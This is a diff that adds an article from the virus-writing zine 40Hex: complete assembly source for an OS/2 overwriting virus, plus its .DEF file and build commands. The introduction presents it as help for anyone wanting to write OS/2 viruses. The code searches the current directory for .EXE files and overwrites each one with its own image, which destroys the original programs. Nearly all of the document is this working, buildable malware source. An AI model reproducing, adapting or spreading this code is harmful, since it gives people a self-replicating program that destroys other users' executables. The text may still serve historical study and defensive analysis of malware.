@@ -1,0 +1,265 @@
+40Hex Number 12 Volume 3 Issue 3                                      File 009
+
+    This virus was given to us by Arthur Ellis, and is the first piece
+of OS/2 virus source that I have ever seen.  Although it is only an
+overwriting virus, it should definately be helpful for anyone who wants
+to write viruses in OS/2.
+
+                                                ->GHeap
+
+-----------------------------<Os2Vir1.Asm>-------------------------------------
+INCLUDE OS2.INC     ; if you don't have OS2.INC, see end of this file
+COMMENT *
+This simple overwriting virus demonstrates how the OS/2 API functions
+are used to search for, open, and infect programs. No extended registers
+are used, and the program may be assembled with MASM 5.1 or 6.0, TASM
+for OS/2 (from the Borland C++ package), or with IBM Macro Assembler/2.
+Link with :link386 /exepack virus,,,c:\os2\doscalls,virus.def
+VIRUS.DEF:         NAME VIRUS WINDOWCOMPAT
+                   PROTMODE
+                   STACKSIZE 8192
+There is minimal error checking (since when do viruses check errors?). A
+useful project for a student would be to convert this program to .386p mode.
+- Arthur Ellis, 1993
+*
+PrintIt     MACRO   string, StrLen
+            push    1                       ; stdout handle
+            push    DS
+            mov     DX, OFFSET string       ; string to write
+            push    DX
+            xor     CX,CX                   ; zero CX
+            mov     CL, [StrLen]            ; string length
+            push    CX
+            push    DS
+            push    OFFSET Written          ; bytes written variable
+            call    DosWrite                ; like int 21/40
+            ENDM
+OpenIt      MACRO   seg, handle, mode       ; SEGMENT, open mode, handle
+            push    seg                     ; SEGMENT of file name
+            push    BX                      ; OFFSET of file name
+            push    DS                      ; SEGMENT of handle
+            push    OFFSET handle           ; OFFSET of handle
+            push    DS                      ; SEGMENT of open action
+            push    OFFSET OpenAction       ; OFFSET of open action
+            push    0                       ; file size DWORD
+            push    0                       ; file size DWORD
+            push    3                       ; attributes: hid,r-o,norm
+            push    1                       ; FILE_OPEN
+            push    mode                    ; OPEN_SHARE_DENYNONE
+            push    0                       ; DWORD 0 (reserved)
+            push    0                       ; DWORD 0 (reserved)
+            Call    DosOpen                 ; like int 21/3D
+            ENDM
+.286p
+
+STACK       SEGMENT PARA STACK 'STACK'
+            DW    1000h
+STACK       ENDS
+
+DGROUP      GROUP   _DATA, STACK
+
+            ASSUME  CS:_TEXT, DS:DGROUP, SS:DGROUP, ES:DGROUP
+
+_DATA       SEGMENT WORD PUBLIC 'DATA'
+
+FileSpec    DB      '*.EXE', 0
+OpenErr     DB      ' <Error opening file>',13,10,27,'[m'
+Hello       DB      27,'[2J',27,'[1;36mMy name is '
+Infected    DB      ' --> infected'
+CRLF        DB      13,10,27,'[m'
+Written     DW      ?                       ; bytes written
+MyHandle    DW      ?                       ; virus handle
+VicHandle   DW      ?                       ; victim handle
+OpenAction  DW      ?                       ; open result
+Buf         FileFindBuf <>                  ; file find structure
+MySize      DW      ?                       ; virus length
+EnvSeg      DW      ?                       ; selector for environment
+CmdOfs      DW      ?                       ; OFFSET of command line
+Image       DB      2000 dup (?)            ; virus image
+ImageLen    DW      ?                       ; length of virus
+DirHandle   DW      -1                      ; directory handle
+SrchCount   DW      1                       ; search count
+_DATA       ENDS
+
+_TEXT       SEGMENT WORD PUBLIC 'CODE'
+            extrn DOSCLOSE:far, DOSEXIT:far, DOSWRITE:far, DOSGETENV:far
+            extrn DOSFINDCLOSE:far, DOSFINDFIRST:far, DOSFINDNEXT:far
+            extrn DOSOPEN:far, DOSREAD:far
+
+main        PROC    far
+start:      call    GetName                 ; get the virus filename
+            OpenIt  ES, MyHandle, 40h       ; open virus for read
+;--------------------------------------------------------------------
+;---( Read virus to image buffer )-----------------------------------
+;--------------------------------------------------------------------
+            push    MyHandle                ; handle for this program
+            push    DS                      ; buffer for file image
+            push    OFFSET Image
+            push    2000                    ; Could use DosQFileInfo to
+                                            ;  get filesize but this works
+            push    DS
+            push    OFFSET ImageLen         ; virus length goes here
+            call    DosRead                 ; like int 21/3F
+;--------------------------------------------------------------------
+;---( Find files to infect )-----------------------------------------
+;--------------------------------------------------------------------
+            call    FindIt                  ; find first file
+
+found:      or      AX, AX                  ; error?
+            jz      NoErr                   ; no error
+
+quit:       push    1                       ; terminate all threads
+            push    0                       ; return code
+            call    DosExit                 ; like int 21/4C
+
+NoErr:      cmp     word ptr SrchCount, 0   ; no files found?
+            jz      quit                    ; none found
+
+            PrintIt Buf.findbuf_achname,Buf.findbuf_cchName
+                                            ; display filename found
+;--------------------------------------------------------------------
+;---( Write virus )--------------------------------------------------
+;--------------------------------------------------------------------
+            lea     BX,Buf.findbuf_achName  ; filename OFFSET in BX
+
+            OpenIt  DS, VicHandle, 42       ; ACCESS_READWRITE|SHAREDENYNONE
+            or      AX,AX                   ; error?
+            jz      proceed
+            PrintIt OpenErr, 25             ; error on open
+            jmp     CloseIt
+
+proceed:    PrintIt Infected,15             ; add to hit list
+            mov     BX,[VicHandle]
+            push    [VicHandle]             ; write to found file
+            push    DS
+            push    OFFSET Image            ; string to write
+            push    [ImageLen]              ; image length
+            push    DS
+            push    OFFSET Written          ; bytes written variable
+            call    DosWrite                ; write the virus
+
+CloseIt:    push    [VicHandle]             ; prepare to close
+            call    DosClose                ; close file
+;--------------------------------------------------------------------
+;---( Find next file )-----------------------------------------------
+;--------------------------------------------------------------------
+            push    DirHandle               ; Directory Handle
+            push    DS                      ; SEGMENT of buffer
+            push    OFFSET Buf              ; OFFSET of buffer
+            push    SIZE Buf                ; length of buffer
+            push    DS                      ; SEGMENT of count
+            push    OFFSET SrchCount        ; OFFSET of count
+            call    DosFindNext             ; Find next file
+                                            ; like int 21/4F
+            jmp     found                   ; infect if found else exit
+
+main        ENDP
+;--------------------------------------------------------------------
+;---( Get virus file name from environment )-------------------------
+;--------------------------------------------------------------------
+GetName     PROC    near
+            push    ds
+            push    OFFSET EnvSeg
+            push    ds
+            push    OFFSET CmdOfs
+            call    DosGetEnv               ; get seg, ofs of command line
+
+            mov     ES,EnvSeg               ; ES:BX holds command line
+            mov     BX,CmdOfs
+
+            xor     DI,DI
+            xor     AL,AL
+            mov     CX,-1
+            cld
+scan:       repne   scasb                   ; scan for double null
+            scasb
+            jne     scan                    ; loop if single null
+            mov     BX,DI                   ; program name address
+            mov     CX,-1                   ; find length
+            repne   scasb                   ; scan for null byte
+            not     CX                      ; convert CX to length
+            dec     CX
+            mov     [MySize],CX             ; return length
+
+            PrintIt Hello, 22
+
+            push    1                       ; stdout handle
+            push    ES                      ; segment for command line
+            push    BX                      ; OFFSET of program name
+            push    [MySize]                ; length of program name
+            push    DS
+            push    OFFSET Written          ; bytes written variable
+            call    DosWrite                ; like int 21/40
+
+            PrintIt CRLF,5
+            ret
+GetName     ENDP
+;--------------------------------------------------------------------
+;---( Find first victim )--------------------------------------------
+;--------------------------------------------------------------------
+FindIt      PROC    near
+            push    DS
+            push    OFFSET FileSpec
+            push    SS                      ; SEGMENT of directory handle
+            lea     AX, DirHandle           ; OFFSET of directory handle
+            push    AX
+            push    07h                     ; attribute
+            push    DS                      ; SEGMENT of buffer
+            push    OFFSET Buf              ; OFFSET of buffer
+            push    SIZE Buf                ; length of buffer
+            push    DS                      ; SEGMENT of search count
+            lea     AX, SrchCount           ; OFFSET of search count
+            push    AX
+            push    0                       ; Reserved
+            push    0
+            call    DosFindFirst            ; Find first file
+            ret                             ; like int 21/4E
+FindIt      ENDP
+;--------------------------------------------------------------------
+_TEXT       ENDS
+            END start
+;--------------------------------------------------------------------
+;--( FTIME structure from OS2.INC )----------------------------------
+;--------------------------------------------------------------------
+;FTIME   STRUC
+;    ftime_fs    DW  ?
+;FTIME   ENDS
+;ftime_twosecs   EQU 01fh
+;ftime_minutes   EQU 07e0h
+;ftime_hours EQU 0f800h
+;--------------------------------------------------------------------
+;--( FDATE structure from OS2.INC )----------------------------------
+;--------------------------------------------------------------------
+;FDATE   STRUC
+;    fdate_fs    DW  ?
+;FDATE   ENDS
+;fdate_day   EQU 01fh
+;fdate_month EQU 01e0h
+;fdate_year  EQU 0fe00h
+;--------------------------------------------------------------------
+;--( FileFindBuf structure from OS2.INC )----------------------------
+;--------------------------------------------------------------------
+;FILEFINDBUF STRUC
+;findbuf_fdateCreation   DB  SIZE FDATE DUP (?)
+;findbuf_ftimeCreation   DB  SIZE FTIME DUP (?)
+;findbuf_fdateLastAccess DB  SIZE FDATE DUP (?)
+;findbuf_ftimeLastAccess DB  SIZE FTIME DUP (?)
+;findbuf_fdateLastWrite  DB  SIZE FDATE DUP (?)
+;findbuf_ftimeLastWrite  DB  SIZE FTIME DUP (?)
+;findbuf_cbFile  DD  ?
+;findbuf_cbFileAlloc DD  ?
+;findbuf_attrFile    DW  ?
+;findbuf_cchName DB  ?
+;findbuf_achName DB  256 DUP (?)
+;FILEFINDBUF ENDS
+;---------------------------------------------------------------------
+
+-----------------------------<Virus.Def>----------------------------------------
+NAME VIRUS WINDOWCOMPAT
+PROTMODE
+STACKSIZE 8192
+
+-----------------------------<DoIt.Cmd>-----------------------------------------
+masm /Zi %1;
+link386 /exepack %1,,,c:\os2\doscalls,virus.def
+
